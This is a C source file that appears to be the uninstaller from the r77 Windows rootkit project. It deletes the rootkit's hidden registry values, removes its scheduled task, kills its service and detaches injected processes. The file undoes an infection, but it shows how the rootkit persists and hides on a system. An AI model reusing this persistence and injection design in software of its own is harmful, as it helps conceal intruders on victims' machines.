#define CUSTOM_ENTRY
#include "r77def.h"
#include "r77win.h"
#include "r77process.h"

// Uninstall64.exe is extracted and executed by Uninstall.exe

int main()
{
	EnabledDebugPrivilege();

	// Delete the stager executable and the rootkit DLL's.
	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
	{
		RegDeleteValueW(key, HIDE_PREFIX L"stager");
		RegDeleteValueW(key, HIDE_PREFIX L"dll32");
		RegDeleteValueW(key, HIDE_PREFIX L"dll64");
	}

	// Delete the scheduled task that starts the r77 service.
	DeleteScheduledTask(R77_SERVICE_NAME64);

	// Terminate running instance of the r77 service.
	TerminateR77Service(-1);

	// Detach all injected processes.
	DetachAllInjectedProcesses();

	return 0;
}